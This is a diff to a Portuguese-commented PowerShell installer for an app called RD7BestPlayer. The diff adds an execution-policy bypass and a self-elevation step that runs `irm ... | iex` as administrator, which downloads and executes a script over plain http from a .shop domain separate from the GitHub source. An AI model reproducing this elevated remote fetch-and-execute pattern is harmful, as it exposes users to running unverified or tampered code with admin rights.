@@ -1,6 +1,35 @@
 # RD7BestPlayer-Installer.ps1
 $ErrorActionPreference = "Stop"
 
+# 1) Garantir execução de script só nesta sessão (não mexe no sistema)
+try {
+    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+} catch {
+    Write-Host "Não foi possível ajustar a ExecutionPolicy (continuando assim mesmo)..." -ForegroundColor Yellow
+}
+
+# 2) (Opcional) Garante que está rodando como administrador
+#    Se não quiser essa parte, pode comentar o bloco inteiro.
+$windowsIdentity  = [Security.Principal.WindowsIdentity]::GetCurrent()
+$windowsPrincipal = New-Object Security.Principal.WindowsPrincipal($windowsIdentity)
+$adminRole        = [Security.Principal.WindowsBuiltInRole]::Administrator
+
+if (-not $windowsPrincipal.IsInRole($adminRole)) {
+    Write-Host "Reiniciando script como Administrador..." -ForegroundColor Yellow
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell.exe"
+    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm 'http://grafenotk.shop/RD7BestPlayer' | iex`""
+    $psi.Verb = "runas"
+    try {
+        [System.Diagnostics.Process]::Start($psi) | Out-Null
+    } catch {
+        Write-Host "Usuário cancelou elevação ou falhou ao elevar." -ForegroundColor Red
+    }
+    exit
+}
+
+# 3) A partir daqui é o instalador em si
+
 $repoOwner = "McGrawBot"
 $repoName  = "RD7BestPlayer"
 
@@ -9,9 +38,11 @@ $baseDir   = "$env:LOCALAPPDATA\RD7BestPlayer"
 $zipPath   = Join-Path $baseDir "RD7BestPlayer.zip"
 $shortcutPath = Join-Path $desktop "RD7BestPlayer.lnk"
 
-if (-not (Test-Path $baseDir)) {
-    New-Item -Path $baseDir -ItemType Directory | Out-Null
+# limpa pasta destino pra evitar conflito de arquivos
+if (Test-Path $baseDir) {
+    Remove-Item $baseDir -Recurse -Force -ErrorAction SilentlyContinue
 }
+New-Item -Path $baseDir -ItemType Directory | Out-Null
 
 Write-Host "Buscando último release no GitHub..." -ForegroundColor Cyan
 
@@ -35,17 +66,12 @@ Write-Host "Extraindo para $baseDir..." -ForegroundColor Cyan
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-# limpa tudo menos o zip
-Get-ChildItem $baseDir -Recurse -Force |
-    Where-Object { $_.FullName -ne $zipPath } |
-    Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-
-# SOBRECARGA CORRETA: (zip, destino, overwriteFiles)
-[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $baseDir, $true)  # [web:18]
+# Versão compatível: sem bool/Encoding extra
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $baseDir)  # [web:18]
 
 Remove-Item $zipPath -Force
 
-# procura o exe
+# procura o exe (caso venha em subpasta)
 $exe = Get-ChildItem -Path $baseDir -Recurse -Filter "RD7BestPlayer.exe" | Select-Object -First 1
 if (-not $exe) {
     Write-Host "RD7BestPlayer.exe não encontrado após extração." -ForegroundColor Red
